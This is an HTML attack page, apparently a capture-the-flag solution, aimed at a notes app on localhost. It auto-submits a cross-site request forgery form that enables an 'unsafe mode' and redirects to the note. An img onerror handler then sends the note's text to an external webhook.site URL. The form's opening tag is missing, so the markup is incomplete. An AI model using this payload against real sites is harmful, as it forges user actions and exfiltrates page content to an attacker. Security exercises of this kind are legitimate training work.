<html>
  <head>
    <!-- CSRF to enable unsafe mode for note 1 -->

      <input type="hidden" name="id" value="1">
      <input type="hidden" name="enable" value="1">
    </form>
    <!-- Redirect to note after submitting form -->
    <meta http-equiv="refresh" content="2; url=http://127.0.0.1:7189/notes/1" />
  </head>

    <script>
      // Automatically submit the form to enable unsafe mode
      document.getElementById('enableUnsafe').submit();
    </script>
    <!-- Capture the flag using img onerror -->
    <img src="invalid" onerror="fetch('https://webhook.site/d1b4da46-4ad8-4ec4-8241-bcdbcefd6aa0?flag=' + encodeURIComponent(document.querySelector('.note-content').innerText))" />
  </body>
</html>
